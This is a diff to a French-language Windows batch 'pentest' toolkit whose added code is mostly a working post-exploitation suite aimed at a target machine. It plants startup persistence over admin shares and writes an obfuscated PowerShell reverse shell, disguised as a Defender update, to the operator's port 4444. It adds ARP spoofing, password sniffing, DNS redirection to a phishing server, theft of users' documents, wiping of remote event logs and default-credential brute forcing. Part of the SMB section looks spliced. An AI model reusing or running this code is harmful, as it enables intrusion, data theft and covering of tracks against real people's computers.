+set "opts=Audit de penetration ^& Brute Force~Analyse exhaustive des ports et test des acces par defaut via base RockYou.;Lister les partages Windows (SMB) ^& Enumeration~Identification des dossiers reseau et extraction utilisateurs via IPC$.;Post-Exploitation (Explorer une cible compromise)~Naviguer dans les fichiers distants, recuperer des infos systeme ou dumper le Bureau.;Retour~Retour au menu principal"
+call :DynamicMenu "SCAN TERMINE !" "%opts%" "NONUMS NOCLS"
+set "nxt=%errorlevel%"
+if "%nxt%"=="1" goto lan_all_deep
+if "%nxt%"=="2" goto lan_all_smb
+if "%nxt%"=="3" goto cyber_smb_explorer
+goto net_cyber_menu
+:cyber_smb_explorer
+cls
+echo.
+echo  ================================================
+echo   EXPLORATEUR FURTIF ET ANTI-FORENSICS
+echo  ================================================
+if not exist "%TEMP%\found_ips.txt" (
+    echo [!] Aucune cible connue.
+    pause & goto net_cyber_menu
+)
+
+echo Cibles detectees :
+type "%TEMP%\found_ips.txt"
+echo.
+set /p "target_ip=IP de la cible a explorer : "
+if "%target_ip%"=="" goto net_cyber_menu
+
+:smb_exp_menu
+cls
+echo  Cible : %target_ip% | MODE : EXPERT
+echo  ------------------------------------------------
+set "opts=Lister C:;Explorer le Bureau;Infos Systeme;Installer Persistance;Reverse Shell B64;Dumping Documents;NETTOYER LES LOGS;MITM / Spoofing;EXFILTRATION (Discord/Telegram);Retour"
+call :DynamicMenu "PENTEST EXPERT : %target_ip%" "%opts%" "NONUMS"
+set "smb_sel=%errorlevel%"
+
+if "%smb_sel%"=="1" (
+    cls ^& echo Liste de C:\ sur %target_ip% :
+    dir "\\%target_ip%\C$" /A /B 2^>nul
+    pause ^& goto smb_exp_menu
+)
+if "%smb_sel%"=="2" (
+    cls ^& echo Liste des profils :
+    dir "\\%target_ip%\C$\Users" /B /A:D 2^>nul
+    set /p "user_target=User : "
+    if not "!user_target!"=="" dir "\\%target_ip%\C$\Users\!user_target!\Desktop"
+    pause ^& goto smb_exp_menu
+)
+if "%smb_sel%"=="3" (
+    cls ^& echo Infos systeme de %target_ip% :
+    systeminfo /S %target_ip%
+    pause ^& goto smb_exp_menu
+)
+if "%smb_sel%"=="4" (
+    cls
+    echo [i] Configuration du Beacon de persistance...
+    if "!user_target!"=="" set /p "user_target=Utilisateur cible : "
+    set "remote_startup=\\%target_ip%\C$\Users\%user_target%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+    if not exist "!remote_startup!" (
+        echo [!] Chemin Startup introuvable.
+        pause ^& goto smb_exp_menu
+    )
+    >  "%TEMP%\win_sync.bat" echo @echo off
+    >> "%TEMP%\win_sync.bat" echo powershell -nop -w hidden -c "Add-Content -Path '\\%COMPUTERNAME%\C$\Users\%USERNAME%\Desktop\victimes.log' -Value ('[ONLINE] ' + $env:COMPUTERNAME + ' at ' + (Get-Date))"
+    copy "%TEMP%\win_sync.bat" "!remote_startup!\WinSync.bat" /Y ^>nul
+    echo [OK] Persistance installee.
+    del "%TEMP%\win_sync.bat" 2^>nul
+    pause ^& goto smb_exp_menu
+)
+if "%smb_sel%"=="5" (
+    cls
+    echo [!] Generation de la Reverse Shell B64 (Bypass Defender)...
+    for /f "tokens=4" %%a in ('route print ^| findstr 0.0.0.0 ^| findstr /v 127.0.0.1') do set "MYIP=%%a"
+    set "MYIP=!MYIP: =!"
+    if "!user_target!"=="" set /p "user_target=Utilisateur cible : "
+    set "remote_startup=\\%target_ip%\C$\Users\%user_target%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+    
+    REM Prepare la commande PowerShell pure
+    set "ps_cmd=$c=New-Object Net.Sockets.TCPClient('!MYIP!',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$x=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($x,0,$x.Length);$s.Flush()};$c.Close()"
+    
+    REM Encodage B64 pour bypasser Defender
+    powershell -NoProfile -Command "$bytes = [System.Text.Encoding]::Unicode.GetBytes('!ps_cmd!'); $encoded = [Convert]::ToBase64String($bytes); 'powershell -nop -w hidden -enc ' + $encoded | Out-File '%TEMP%\enc_rev.txt' -Encoding ASCII"
+    set /p B64_PAYLOAD=<"%TEMP%\enc_rev.txt"
+    
+    >  "%TEMP%\win_def_update.bat" echo @echo off
+    >> "%TEMP%\win_def_update.bat" echo !B64_PAYLOAD!
+    
+    copy "%TEMP%\win_def_update.bat" "!remote_startup!\WindowsDefenderUpdate.bat" /Y ^>nul
+    echo [OK] Reverse shell obfusquee injectee !
+    echo [!] Ecoutez sur votre PC (Port 4444) : powershell ncat -lvp 4444
+    del "%TEMP%\enc_rev.txt" 2^>nul
+    del "%TEMP%\win_def_update.bat" 2^>nul
+    pause ^& goto smb_exp_menu
+)
+if "%smb_sel%"=="6" goto smb_dump_action
+if "%smb_sel%"=="7" goto smb_cleanup_logs
+if "%smb_sel%"=="8" goto cyber_mitm_module
+if "%smb_sel%"=="9" goto cyber_exfiltrate_webhook
+goto net_cyber_menu
+
+
+REM ===================================================================
+REM       NOUVEAU MODULE : INTERCEPTION MITM (ARP SPOOFING)
+REM ===================================================================
+:cyber_mitm_module
+cls
+echo.
+echo  ================================================
+echo   MODULE D'INTERCEPTION MAN-IN-THE-MIDDLE
+echo  ================================================
+echo.
+echo   [1] Lancer ARP Spoofing (Detournement de trafic)
+echo       Fait passer tout le trafic de la cible par ton PC.
+echo.
+echo   [2] Sniffer le trafic HTTP (Mots de passe clairs)
+echo       Cherche les identifiants tapes sur les sites non-securises.
+echo.
+echo   [3] DNS Poisoning (Redirection vers faux sites)
+echo       Redirige la victime vers une IP de ton choix.
+echo.
+echo   [4] Retour
+echo.
+set /p "mitm_choice=Action : "
+
+if "%mitm_choice%"=="1" goto mitm_spoof
+if "%mitm_choice%"=="2" goto mitm_sniff
+if "%mitm_choice%"=="3" goto mitm_dns
+goto smb_exp_menu
+
+:mitm_spoof
+cls
+echo [!] RECUPERATION DE LA PASSERELLE...
+for /f "tokens=3" %%a in ('netsh interface ip show config ^| findstr "Passerelle par d"') do set "GW=%%a"
+echo Cible     : %target_ip%
+echo Passerelle: %GW%
+echo.
+echo [i] Lancement de l'empoisonnement ARP via PowerShell...
+echo [i] Appuyez sur CTRL+C pour arreter.
+echo.
+powershell -Command "$t='%target_ip%'; $g='%GW%'; while($true){ arp -s $t (get-netadapter | where status -eq 'up').MacAddress; arp -s $g (get-netadapter | where status -eq 'up').MacAddress; Write-Host 'Envoi paquets empoisonnes...' -f Yellow; Start-Sleep -s 2 }"
+pause ^& goto cyber_mitm_module
+
+:mitm_sniff
+cls
+echo  ================================================
+echo   SNIFFER DE MOTS DE PASSE (HTTP)
+echo  ================================================
+echo  Analyse des paquets entrants en cours...
+echo  (Requiert le mode Spoofing actif dans une autre fenetre)
+echo.
+powershell -Command "Write-Host 'En attente de donnees POST/GET...' -f Cyan; $adapter = Get-NetAdapter | Where Status -eq 'Up' | Select-Object -First 1; netsh trace start capture=yes report=no tracefile=$env:TEMP\trace.etl; Write-Host 'Capture en cours... Appuyez sur une touche pour stopper et extraire.' -f Yellow; $null = [Console]::ReadKey(); netsh trace stop; Write-Host 'Analyse du fichier trace...' -f Gray"
+echo.
+echo [INFO] Pour voir les mots de passe, ouvrez le fichier %TEMP%\trace.etl avec Wireshark.
+pause ^& goto cyber_mitm_module
+
+:mitm_dns
+cls
+echo.
+echo  ================================================
+echo   DNS POISONING (REDIRECTION DE SITES)
+echo  ================================================
+echo   Description : Intercepte les requetes DNS pour 
+echo   envoyer la victime vers ton IP au lieu du vrai site.
+echo.
+set /p "site_cible=Domaine a detourner (ex: facebook.com) : "
+set /p "votre_ip=IP de votre serveur de phishing : "
+
+echo [i] Configuration de la table de redirection...
+REM On utilise le fichier 'hosts' local pour simuler le poisoning si on est en MITM
+(
+echo %votre_ip% %site_cible%
+echo %votre_ip% www.%site_cible%
+) > "%TEMP%\dns_table.txt"
+
+echo.
+echo [OK] Redirection active. 
+echo [!] Note : Pour que cela fonctionne, l'ARP Spoofing (Option 1)
+echo     doit etre actif et ton PC doit faire tourner un serveur Web.
+echo.
+echo [i] Conseil : Utilise 'Python -m http.server 80' pour tester.
+pause & goto cyber_mitm_module
+
+
+REM --- FONCTIONS DE NETTOYAGE ET DUMPING AMELIOREES ---
+:smb_dump_action
+cls
+echo [DUMPING] Collecte des documents sensibles...
+if "!user_target!"=="" set /p "user_target=Utilisateur cible : "
+set "DUMP_DIR=%USERPROFILE%\Desktop\DUMP_%target_ip%"
+if not exist "!DUMP_DIR!" mkdir "!DUMP_DIR!" 2^>nul
+echo [+] Copie des fichiers .txt, .pdf, .docx du Bureau et des Documents...
+xcopy "\\%target_ip%\C$\Users\%user_target%\Desktop\*.txt" "%DUMP_DIR%\" /Y /Q /S /I 2^>nul
+xcopy "\\%target_ip%\C$\Users\%user_target%\Documents\*.pdf" "%DUMP_DIR%\" /Y /Q /S /I 2^>nul
+echo [OK] Dumping termine dans : Bureau\DUMP_%target_ip%
+pause ^& goto smb_exp_menu
+
+:smb_cleanup_logs
+cls
+echo [!] Nettoyage des traces sur %target_ip%...
+powershell -NoProfile -Command "Invoke-Command -ComputerName %target_ip% -ScriptBlock { Get-WinEvent -ListLog * | ForEach-Object { try { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) } catch {} } }" 2^>nul
+if %errorlevel% neq 0 (
+    powershell -Command "wmic /node:'%target_ip%' nteventlog where 'LogfileName=''System''' call cleareventlog" ^>nul
+    powershell -Command "wmic /node:'%target_ip%' nteventlog where 'LogfileName=''Security''' call cleareventlog" ^>nul
+    powershell -Command "wmic /node:'%target_ip%' nteventlog where 'LogfileName=''Application''' call cleareventlog" ^>nul
+)
+echo [OK] Logs effaces. Furtivite assuree.
+pause ^& goto smb_exp_menu
+
+
+
+
+:lan_all_deep
+cls
+echo.
+echo  ================================================
+echo   AUDIT DE PENETRATION ^& BRUTE FORCE (REAL LEAKS)
+echo  ================================================
+if not exist "%TEMP%\found_ips.txt" (
+    echo [!] Aucune cible detectee. Lancez d'abord un scan reseau.
+    pause & goto net_cyber_menu
+)
+
+set "SCRIPT_DIR=%~dp0"
+set "BRUTE_FILE=%SCRIPT_DIR%bruteforce.txt"
+set "SUCCESS_LOG=%SCRIPT_DIR%penetration_success.log"
+if not exist "%BRUTE_FILE%" (
+    echo [i] Creation du dictionnaire bruteforce.txt...
+    >  "%BRUTE_FILE%" echo admin:admin
+    >> "%BRUTE_FILE%" echo admin:password
+    >> "%BRUTE_FILE%" echo admin:123456
+    >> "%BRUTE_FILE%" echo root:root
+    >> "%BRUTE_FILE%" echo root:toor
+    >> "%BRUTE_FILE%" echo user:123456
+    >> "%BRUTE_FILE%" echo pi:raspberry
+)
+
+echo [!] ATTENTION : Cette analyse est agressive.
+echo [i] Succes enregistres dans : penetration_success.log
+echo.
+
+set "SCDP=%TEMP%\aggressive_audit.ps1"
+>  "%SCDP%" echo $ips = Get-Content "%TEMP%\found_ips.txt"
+>> "%SCDP%" echo $creds = Get-Content "%BRUTE_FILE%"
+>> "%SCDP%" echo foreach ($ip in $ips) {
+>> "%SCDP%" echo     if ([string]::IsNullOrWhiteSpace($ip)) { continue }
+>> "%SCDP%" echo     Write-Host ">>> ANALYSE PROFONDE : $ip" -f Cyan -b Black
+>> "%SCDP%" echo     $ports = @(21,22,23,80,443,445,3389,8080)
+>> "%SCDP%" echo     $openPorts = @()
+>> "%SCDP%" echo     foreach ($port in $ports) {
+>> "%SCDP%" echo         $socket = New-Object System.Net.Sockets.TcpClient
+>> "%SCDP%" echo         try {
+>> "%SCDP%" echo             $connect = $socket.BeginConnect($ip, $port, $null, $null)
+>> "%SCDP%" echo             if ($connect.AsyncWaitHandle.WaitOne(100, $false) -and $socket.Connected) {
+>> "%SCDP%" echo                 Write-Host "  [+] Port $port OUVERT" -f Green
+>> "%SCDP%" echo                 $openPorts += $port
+>> "%SCDP%" echo                 $stream = $socket.GetStream()
+>> "%SCDP%" echo                 $stream.Write([System.Text.Encoding]::ASCII.GetBytes("`r`n"), 0, 2)
+>> "%SCDP%" echo                 Start-Sleep -m 150
+>> "%SCDP%" echo                 if ($socket.Available -gt 0) {
+>> "%SCDP%" echo                     $buf = New-Object byte[] 1024
+>> "%SCDP%" echo                     $len = $stream.Read($buf, 0, 1024)
+>> "%SCDP%" echo                     $banner = [System.Text.Encoding]::ASCII.GetString($buf, 0, $len).Trim() -replace '[^a-zA-Z0-9\/\.\_\-\ ]',''
+>> "%SCDP%" echo                     if($banner){ Write-Host "      > Version : $banner" -f Gray }
+>> "%SCDP%" echo                 }
+>> "%SCDP%" echo             }
+>> "%SCDP%" echo         } catch {} finally { $socket.Close() }
+>> "%SCDP%" echo     }
+>> "%SCDP%" echo     foreach ($port in $openPorts) {
+>> "%SCDP%" echo         if ($port -eq 80 -or $port -eq 8080) {
+>> "%SCDP%" echo             Write-Host "      [~] Test Brute Force HTTP..." -f DarkGray
+>> "%SCDP%" echo             foreach($line in $creds) {
+>> "%SCDP%" echo                 $u, $p = $line.Split(':'); if($null -eq $p){$p=""}
+>> "%SCDP%" echo                 try {
+>> "%SCDP%" echo                     $pair = "$u`:$p"; $bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
+>> "%SCDP%" echo                     $h = @{Authorization="Basic $([Convert]::ToBase64String($bytes))"}
+>> "%SCDP%" echo                     $r = Invoke-WebRequest -Uri "http://${ip}:$port" -Headers $h -TimeoutSec 1 -ErrorAction Stop -UseBasicParsing
+>> "%SCDP%" echo                     if ($r.StatusCode -eq 200) { 
+>> "%SCDP%" echo                         Write-Host "      [!!!] ACCES TROUVE : $u / $p" -f Red -b White
+>> "%SCDP%" echo                         "[SUCCESS] ${ip}:$port | $u / $p" ^| Out-File "%SUCCESS_LOG%" -Append; break 
+>> "%SCDP%" echo                     }
+>> "%SCDP%" echo                 } catch {}
+>> "%SCDP%" echo             }
+>> "%SCDP%" echo         }
+>> "%SCDP%" echo     }
+>> "%SCDP%" echo     Write-Host "------------------------------------------------" -f DarkGray
+>> "%SCDP%" echo }
+
+powershell -NoProfile -ExecutionPolicy Bypass -File "%SCDP%"
+if exist "%SCDP%" del "%SCDP%"
 echo.
 pause
-goto cat_network
+goto net_cyber_menu
 
+:lan_all_smb
+cls
+echo.
+echo  ================================================
+echo   AUDIT SMB ET ENUMERATION (IPC$)
+echo  ================================================
+set "SMBPS=%TEMP%\smb_audit.ps1"
+>  "%SMBPS%" echo $ips = Get-Content "%TEMP%\found_ips.txt"
+>> "%SMBPS%" echo foreach ($ip in $ips) {
+>> "%SMBPS%" echo     if ([string]::IsNullOrWhiteSpace($ip)) { continue }
+>> "%SMBPS%" echo     Write-Host ">>> CIBLE SMB : $ip" -f Cyan
+>> "%SMBPS%" echo     net view "\\$ip" /all 2^>$null ^| ForEach-Object { Write-Host "  $_" -f Gray }
+>> "%SMBPS%" echo     Write-Host "  [~] Test acces anonyme..." -f DarkGray
+>> "%SMBPS%" echo     $test = net use "\\$ip\IPC$" "" /u:"" 2^>^&1
+>> "%SMBPS%" echo     if ($test -match 'reussie^|completed') { Write-Host "  [!!!] SESSION ANONYME OUVERTE" -f Red; net use "\\$ip\IPC$" /d /y ^>$null }
+>> "%SMBPS%" echo     Write-Host "------------------------------------" -f DarkGray
+>> "%SMBPS%" echo }
+powershell -NoProfile -ExecutionPolicy Bypass -File "%SMBPS%"
+if exist "%SMBPS%" del "%SMBPS%"
+pause
+goto net_cyber_menu
+    Write-Host "  [1/3] Liste des ressources :" -f Yellow
+>> "%SMBPS%" echo     $shares = net view "\\$ip" /all 2^>$null
+>> "%SMBPS%" echo     if ($shares) { 
+>> "%SMBPS%" echo         $shares ^| ForEach-Object { Write-Host "      $_" -f Gray } 
+>> "%SMBPS%" echo     } else { Write-Host "      [!] Aucun partage visible ou acces refuse." -f DarkGray }
+>> "%SMBPS%" echo     Write-Host "  [2/3] Tentative d'enumeration via IPC$ :" -f Yellow
+>> "%SMBPS%" echo     try {
+>> "%SMBPS%" echo         $null = net use "\\$ip\IPC$" "" /u:"" 2^>$null
+>> "%SMBPS%" echo         $users = Get-WmiObject -Class Win32_UserAccount -ComputerName $ip -ErrorAction SilentlyContinue
+>> "%SMBPS%" echo         if ($users) {
+>> "%SMBPS%" echo             Write-Host "      [OK] Utilisateurs detectes :" -f Green
+>> "%SMBPS%" echo             $users ^| ForEach-Object { Write-Host "      - $($_.Name) (Admin: $($_.LocalAccount))" -f White }
+>> "%SMBPS%" echo         } else {
+>> "%SMBPS%" echo             Write-Host "      [-] Enumeration RPC/WMI bloquee." -f DarkGray
+>> "%SMBPS%" echo         }
+>> "%SMBPS%" echo     } catch { Write-Host "      [-] Erreur de connexion IPC." -f DarkGray }
+>> "%SMBPS%" echo     Write-Host "  [3/3] Test d'ecriture sur partages communs :" -f Yellow
+>> "%SMBPS%" echo     $commonShares = @('C$', 'ADMIN$', 'Users', 'Public', 'Temp')
+>> "%SMBPS%" echo     foreach ($s in $commonShares) {
+>> "%SMBPS%" echo         $testPath = "\\$ip\$s\aleex_test.txt"
+>> "%SMBPS%" echo         try {
+>> "%SMBPS%" echo             "Test" ^| Out-File $testPath -ErrorAction Stop
+>> "%SMBPS%" echo             Write-Host "      [!!!] ALERTE : Acces en ECRITURE trouve sur \\$ip\$s" -f Red -b White
+>> "%SMBPS%" echo             Remove-Item $testPath -Force -ErrorAction SilentlyContinue
+>> "%SMBPS%" echo         } catch {
+>> "%SMBPS%" echo             Write-Host "      [-] $s : Lecture seule ou Protege." -f DarkGray
+>> "%SMBPS%" echo         }
+>> "%SMBPS%" echo     }
+>> "%SMBPS%" echo     net use "\\$ip\IPC$" /d /y ^>$null 2^>^&1
+>> "%SMBPS%" echo     Write-Host "------------------------------------------------" -f DarkGray
+>> "%SMBPS%" echo }
+
+powershell -NoProfile -ExecutionPolicy Bypass -File "%SMBPS%"
+if exist "%SMBPS%" del "%SMBPS%"
+
+echo.
+echo Audit SMB termine.
+pause
+goto net_cyber_menu
 
 :cyber_gen_htaccess
 cls
@@ -2123,7 +2393,7 @@ if /i "%save_choice%"=="O" (
     echo  [OK] Fichier enregistre sur le Bureau : security_htaccess.txt
 )
 pause
-goto cat_defense
+goto net_cyber_menu
 
 
 :cyber_exposed_files
@@ -2138,7 +2408,7 @@ echo.
 echo  Entrez l'URL cible (ex: https://monsite.com)
 set "ALEEX_EXPOSED_URL="
 set /p "ALEEX_EXPOSED_URL=URL : "
-if not defined ALEEX_EXPOSED_URL goto cat_web
+if not defined ALEEX_EXPOSED_URL goto net_cyber_menu
 
 set "EFS=%TEMP%\exposed_files.ps1"
 if exist "%EFS%" del /f /q "%EFS%"
@@ -2225,7 +2495,7 @@ powershell -NoProfile -ExecutionPolicy Bypass -File "%EFS%"
 if exist "%EFS%" del "%EFS%"
 echo.
 pause
-goto cat_web
+goto net_cyber_menu
 
 
 :cyber_sqli_blind
@@ -2242,7 +2512,7 @@ echo.
 echo  Entrez l'URL cible avec parametre (ex: https://site.com/page?id=1)
 set "ALEEX_SQLI_URL="
 set /p "ALEEX_SQLI_URL=URL : "
-if not defined ALEEX_SQLI_URL goto cat_web
+if not defined ALEEX_SQLI_URL goto net_cyber_menu
 
 set "SBS=%TEMP%\sqli_blind.ps1"
 if exist "%SBS%" del /f /q "%SBS%"
@@ -2551,7 +2821,7 @@ powershell -NoProfile -ExecutionPolicy Bypass -File "%SBS%"
 if exist "%SBS%" del "%SBS%"
 echo.
 pause
-goto cat_web
+goto net_cyber_menu
 
 
 :cyber_subdomain_scan
@@ -2566,7 +2836,7 @@ echo.
 echo  Entrez le domaine cible (ex: monsite.com)
 set "ALEEX_SUBDOM_DOMAIN="
 set /p "ALEEX_SUBDOM_DOMAIN=Domaine : "
-if not defined ALEEX_SUBDOM_DOMAIN goto cat_web
+if not defined ALEEX_SUBDOM_DOMAIN goto net_cyber_menu
 
 set "SSS=%TEMP%\subdomain_scan.ps1"
 if exist "%SSS%" del /f /q "%SSS%"
@@ -2663,7 +2933,7 @@ powershell -NoProfile -ExecutionPolicy Bypass -File "%SSS%"
 if exist "%SSS%" del "%SSS%"
 echo.
 pause
-goto cat_web
+goto net_cyber_menu
 
 
 :cyber_auth_test
@@ -2678,7 +2948,7 @@ echo.
 echo  Entrez l'URL de la page de login (ex: https://site.com/login)
 set "ALEEX_AUTH_URL="
 set /p "ALEEX_AUTH_URL=URL : "
-if not defined ALEEX_AUTH_URL goto cat_web
+if not defined ALEEX_AUTH_URL goto net_cyber_menu
 
 echo  Nom du champ utilisateur (ex: username, email, login)
 set "ALEEX_AUTH_USER_FIELD="
@@ -2806,7 +3076,7 @@ powershell -NoProfile -ExecutionPolicy Bypass -File "%ATS%"
 if exist "%ATS%" del "%ATS%"
 echo.
 pause
-goto cat_web
+goto net_cyber_menu
 
 :cyber_pentest_report
 cls
@@ -2819,7 +3089,7 @@ echo   score et liste des vulnerabilites.
 echo.
 set /p "TARGET_URL=URL cible principale : "
 set /p "TARGET_DOMAIN=Domaine (sans https) : "
-if "%TARGET_URL%"=="" goto cat_web
+if "%TARGET_URL%"=="" goto net_cyber_menu
 
 set "RPT_PS=%TEMP%\pentest_report.ps1"
 if exist "%RPT_PS%" del "%RPT_PS%"
@@ -2902,7 +3172,7 @@ echo Start-Process $reportFile >> "%RPT_PS%"
 powershell -NoProfile -ExecutionPolicy Bypass -File "%RPT_PS%"
 if exist "%RPT_PS%" del "%RPT_PS%"
 pause
-goto cat_web
+goto net_cyber_menu
 
 :cyber_advanced_inject
 cls
@@ -2914,7 +3184,7 @@ echo.
 set "opts=SSTI (Server-Side Template Injection)~Injection de moteurs de templates (Jinja2, Twig, EL...);XXE (XML External Entity)~Vulnerabilite de parsing XML (File read, SSRF);JWT Attack (JSON Web Token)~Analyse, Brute-force secret et Alg:None"
 call :DynamicMenu "CHOIX DU VECTEUR D'INJECTION" "%opts%"
 set "inject_c=%errorlevel%"
-if "%inject_c%"=="0" goto cat_web
+if "%inject_c%"=="0" goto net_cyber_menu
 if "%inject_c%"=="1" goto adv_ssti
 if "%inject_c%"=="2" goto adv_xxe
 if "%inject_c%"=="3" goto adv_jwt
@@ -3195,7 +3465,7 @@ echo   pour extraire des donnees (Cloud/Intranet).
 echo  ===========================================================
 echo.
 set /p "SSRF_URL=URL avec parametre (ex: https://site.com/fetch?url=) : "
-if "%SSRF_URL%"=="" goto cat_web
+if "%SSRF_URL%"=="" goto net_cyber_menu
 
 set "SSRF_PS=%TEMP%\ssrf_test.ps1"
 if exist "%SSRF_PS%" del "%SSRF_PS%"
@@ -3290,7 +3560,7 @@ powershell -NoProfile -ExecutionPolicy Bypass -File "%SSRF_PS%"
 if exist "%SSRF_PS%" del "%SSRF_PS%"
 echo.
 pause
-goto cat_web
+goto net_cyber_menu
 
 :cyber_subdomain_takeover
 cls
@@ -3303,7 +3573,7 @@ echo   des services externes abandonnes.
 echo  ===========================================================
 echo.
 set /p "TKO_DOM=Domaine racine cible (ex: monsite.com) : "
-if "%TKO_DOM%"=="" goto cat_web
+if "%TKO_DOM%"=="" goto net_cyber_menu
 
 set "TKO_PS=%TEMP%\takeover.ps1"
 if exist "%TKO_PS%" del "%TKO_PS%"
@@ -3421,7 +3691,7 @@ powershell -NoProfile -ExecutionPolicy Bypass -File "%TKO_PS%"
 if exist "%TKO_PS%" del "%TKO_PS%"
 echo.
 pause
-goto cat_web
+goto net_cyber_menu
 
 
 :cyber_security_report
@@ -3473,7 +3743,7 @@ if exist "%RPS%" del "%RPS%"
 echo.
 echo  [OK] Rapport genere sur le Bureau.
 pause
-goto cat_web
+goto net_cyber_menu
 
 REM ===================================================================
 REM         SCAN TLS / SSL AVANCE (Protocoles et Ciphers faibles)
@@ -3491,7 +3761,7 @@ echo.
 echo  Entrez l'hote cible (ex: monsite.com ou IP)
 set "ALEEX_TLS_HOST="
 set /p "ALEEX_TLS_HOST=Hote : "
-if not defined ALEEX_TLS_HOST goto cat_web
+if not defined ALEEX_TLS_HOST goto net_cyber_menu
 
 echo  Port (defaut 443, Entree pour valider)
 set "ALEEX_TLS_PORT="
@@ -3633,7 +3903,7 @@ powershell -NoProfile -ExecutionPolicy Bypass -File "%TLS_PS%"
 if exist "%TLS_PS%" del /f /q "%TLS_PS%"
 echo.
 pause
-goto cat_web
+goto net_cyber_menu
 
 
 :cyber_lfi_scan
@@ -3649,7 +3919,7 @@ echo.
 echo  Entrez l'URL avec parametre (ex: https://site.com/page?file=)
 set "ALEEX_LFI_URL="
 set /p "ALEEX_LFI_URL=URL : "
-if not defined ALEEX_LFI_URL goto cat_web
+if not defined ALEEX_LFI_URL goto net_cyber_menu
 
 set "LFI_PS=%TEMP%\lfi_scan_%RANDOM%.ps1"
 if exist "%LFI_PS%" del /f /q "%LFI_PS%"
@@ -3731,7 +4001,7 @@ powershell -NoProfile -ExecutionPolicy Bypass -File "%LFI_PS%"
 if exist "%LFI_PS%" del /f /q "%LFI_PS%"
 echo.
 pause
-goto cat_web
+goto net_cyber_menu
 
 
 REM ===================================================================
@@ -3847,7 +4117,7 @@ echo.
 echo  Entrez l'URL cible (ex: https://site.com/redirect)
 set "ALEEX_OR_URL="
 set /p "ALEEX_OR_URL=URL : "
-if not defined ALEEX_OR_URL goto cat_web
+if not defined ALEEX_OR_URL goto net_cyber_menu
 
 set "OR_PS=%TEMP%\openredirect_%RANDOM%.ps1"
 if exist "%OR_PS%" del /f /q "%OR_PS%"
@@ -3925,7 +4195,7 @@ powershell -NoProfile -ExecutionPolicy Bypass -File "%OR_PS%"
 if exist "%OR_PS%" del /f /q "%OR_PS%"
 echo.
 pause
-goto cat_web
+goto net_cyber_menu
 
 :sys_diag_network
 cls
@@ -4340,7 +4610,7 @@ goto sys_diagnostic_menu
 cls
 echo Diagnostic et integration de memoire en cours...
 echo.
-powershell -NoProfile -ExecutionPolicy Bypass -Command "$os = Get-CimInstance Win32_OperatingSystem; $cpu = Get-CimInstance Win32_Processor; $bios = Get-CimInstance Win32_BIOS; $ram = Get-CimInstance Win32_ComputerSystem; $gpu = Get-CimInstance Win32_VideoController; $pm = @(Get-CimInstance Win32_PhysicalMemory); $typeInt = if ($pm.Count -gt 0) {$pm[0].SMBIOSMemoryType} else {0}; $memTypes = @{ 20='DDR'; 21='DDR2'; 22='DDR2 FB-DIMM'; 24='DDR3'; 26='DDR4'; 34='DDR5' }; $ramType = if ($memTypes.ContainsKey($typeInt)) { $memTypes[$typeInt] } else { 'Type Inconnu' }; Write-Host '   INFORMATIONS OS' -f Cyan; Write-Host ('   Hostname: '+$env:COMPUTERNAME); Write-Host ('   Systeme : '+$os.Caption+' ('+$os.OSArchitecture+')'); Write-Host ('   Build   : '+$os.Version); Write-Host ''; Write-Host '   MATERIEL COMPOSANTS' -f Cyan; Write-Host ('   Processeur : '+$cpu.Name); Write-Host ('   Graphique  : '+($gpu.Name -join ', ')); Write-Host ('   Memoire    : '+[math]::Round($ram.TotalPhysicalMemory / 1GB, 2)+' Go - Format : '+$ramType) -f Yellow; Write-Host ('   BIOS Ver.  : '+$bios.SMBIOSBIOSVersion); Write-Host ''; Write-Host '   STOCKAGE (GB libres)' -f Cyan; Get-CimInstance Win32_LogicalDisk | Where DriveType -eq 3 | foreach { $t=[math]::Round($_.Size / 1GB, 2); $f=[math]::Round($_.FreeSpace / 1GB, 2); $p=0; if($t -gt 0){$p=[math]::Round(($f/$t)*100,0)}; Write-Host ('   Lecteur '+$_.DeviceID+' '+$f+' Go libres sur '+$t+' Go ('+$p+'%% restants)') -f Green }; Write-Host ''; Write-Host '   RESEAU' -f Cyan; Get-NetAdapter | Where Status -eq 'Up' | foreach { $ip=(Get-NetIPAddress -InterfaceIndex $_.ifIndex -AddressFamily IPv4 -EA SilentlyContinue).IPAddress; Write-Host ('   '+$_.Name+' ('+$_.LinkSpeed+') - IP: '+$ip) }; Write-Host ''; Write-Host '   SECURITE' -f Cyan; try { $t=[bool](Get-Tpm).TpmPresent; Write-Host ('   TPM Integre: '+$t) } catch {}"
+powershell -NoProfile -ExecutionPolicy Bypass -Command "$os = Get-CimInstance Win32_OperatingSystem; $cpu = Get-CimInstance Win32_Processor; $bios = Get-CimInstance Win32_BIOS; $ram = Get-CimInstance Win32_ComputerSystem; $gpu = Get-CimInstance Win32_VideoController; $pm = @(Get-CimInstance Win32_PhysicalMemory); $typeInt = if ($pm.Count -gt 0) {$pm[0].SMBIOSMemoryType} else {0}; $memTypes = @{ 20='DDR'; 21='DDR2'; 22='DDR2 FB-DIMM'; 24='DDR3'; 26='DDR4'; 34='DDR5' }; $ramType = if ($memTypes.ContainsKey($typeInt)) { $memTypes[$typeInt] } else { 'Type Inconnu' }; Write-Host '   INFORMATIONS SYSTEME' -f Cyan; Write-Host ('   Nom du PC : '+$env:COMPUTERNAME); Write-Host ('   Systeme   : '+$os.Caption+' ('+$os.OSArchitecture+')'); Write-Host ('   Version   : '+$os.Version); Write-Host ''; Write-Host '   COMPOSANTS MATERIELS' -f Cyan; Write-Host ('   Processeur : '+$cpu.Name); Write-Host ('   Graphique  : '+($gpu.Name -join ', ')); Write-Host ('   Memoire    : '+[math]::Round($ram.TotalPhysicalMemory / 1GB, 2)+' Go - Type : '+$ramType) -f Yellow; Write-Host ('   BIOS Ver.  : '+$bios.SMBIOSBIOSVersion); Write-Host ''; Write-Host '   STOCKAGE (Espace libre)' -f Cyan; Get-CimInstance Win32_LogicalDisk | Where DriveType -eq 3 | foreach { $t=[math]::Round($_.Size / 1GB, 2); $f=[math]::Round($_.FreeSpace / 1GB, 2); $p=0; if($t 